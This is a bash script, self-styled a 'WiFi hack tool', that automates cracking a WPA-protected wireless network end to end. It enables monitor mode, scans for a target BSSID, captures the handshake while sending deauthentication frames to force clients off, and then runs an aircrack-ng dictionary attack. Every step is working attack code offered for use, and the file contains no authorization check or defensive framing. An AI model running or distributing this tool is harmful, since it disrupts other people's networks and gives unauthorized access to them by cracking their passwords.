#!/bin/bash

# Colors
red="\e[31m"
green="\e[32m"
cyan="\e[36m"
yellow="\e[33m"
reset="\e[0m"

# Hacker-style banner
clear
echo -e "${cyan}"
echo "─────────────────────────────────────────────"
echo -e "${green}        ▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄"
echo -e "${green}           A & D WIFI HACK TOOL"
echo -e "${green}        ▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀"
echo -e "${cyan}─────────────────────────────────────────────"
echo -e "${reset}"
sleep 1

# --- Step 1: Ask for Wireless Interface ---
echo -e "${yellow}\nAvailable interfaces:${reset}"
iwconfig | grep -o "^[^ ]*"
echo ""

while true; do
    echo -ne "${green}Enter your wireless interface name (e.g., wlan0): ${reset}"
    read interface
    if iwconfig $interface &>/dev/null; then
        break
    else
        echo -e "${red}[!] Invalid interface. Try again.${reset}"
    fi
done

# Enable Monitor Mode
echo -e "${cyan}[*] Enabling Monitor Mode...${reset}"
sudo airmon-ng start $interface
mon_iface="${interface}mon"
sleep 2

if ! iwconfig $mon_iface &>/dev/null; then
    echo -e "${red}[!] Monitor mode interface not found. Exiting.${reset}"
    exit 1
fi

# --- Step 2: Scan for Networks ---
echo -e "${cyan}[*] Scanning for nearby WiFi networks...${reset}"
echo -e "${green}[*] Press Ctrl+C once you spot your target network (BSSID & channel).${reset}"
sleep 2
sudo airodump-ng $mon_iface

# --- Step 3: Target Network Info ---
while true; do
    echo -ne "${green}Enter Target BSSID: ${reset}"
    read bssid
    echo -ne "${green}Enter Target Channel: ${reset}"
    read channel
    if [[ "$bssid" =~ ([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2} ]] && [[ "$channel" =~ ^[0-9]+$ ]]; then
        break
    else
        echo -e "${red}[!] Invalid BSSID or channel. Please try again.${reset}"
    fi
done

echo -ne "${green}Enter filename to save captured handshake (no extension): ${reset}"
read file

# --- Step 4: Start Capturing Handshake ---
echo -e "${cyan}[*] Capturing WPA Handshake...${reset}"
xterm -hold -e "sudo airodump-ng --bssid $bssid -c $channel -w $file $mon_iface" &
sleep 5

# --- Step 5: Launch Deauth Attack ---
echo -e "${cyan}[*] Launching Deauth attack to force handshake...${reset}"
xterm -hold -e "sudo aireplay-ng --deauth 10 -a $bssid $mon_iface" &
sleep 15

echo -e "${green}[+] Wait for WPA Handshake capture. Close airodump window manually.${reset}"
read -p "Press Enter once handshake is captured and airodump is closed..."

# --- Step 6: Dictionary Attack ---
while true; do
    echo -ne "${green}Enter path to your wordlist file (e.g., /usr/share/wordlists/rockyou.txt): ${reset}"
    read wordlist
    if [[ -f "$wordlist" ]]; then
        break
    else
        echo -e "${red}[!] Wordlist file not found. Try again.${reset}"
    fi
done

echo -e "${cyan}[*] Starting dictionary attack using aircrack-ng...${reset}"
sudo aircrack-ng -w $wordlist -b $bssid ${file}-01.cap

# --- Step 7: Disable Monitor Mode ---
echo -e "${cyan}[*] Disabling Monitor Mode...${reset}"
sudo airmon-ng stop $mon_iface
echo -e "${green}[✓] Tool Finished. Monitor Mode Disabled.${reset}"
